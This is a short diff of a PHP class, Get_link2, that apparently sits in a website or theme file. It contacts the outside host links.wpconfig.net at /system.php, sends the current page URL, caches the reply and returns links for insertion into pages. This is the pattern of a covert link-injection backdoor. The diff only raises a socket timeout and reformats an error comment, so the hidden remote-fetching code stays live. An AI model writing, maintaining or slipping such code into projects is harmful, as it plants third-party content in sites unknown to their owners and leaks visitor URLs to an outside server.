@@ -14,7 +14,7 @@ class Get_link2 {
     var $host = 'links.wpconfig.net';
     var $path = '/system.php';
     var $_cache_lifetime    = 21600;
-    var $_socket_timeout    = 5;
+    var $_socket_timeout    = 10;
 
     function get_remote() {
     $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
@@ -44,7 +44,7 @@ class Get_link2 {
             $data = @$data[2];
             return $data;
         }
-           return '<!--link error-->';
+           return '<!-- link error -->';
       }
 
     function return_links($lib_path) {
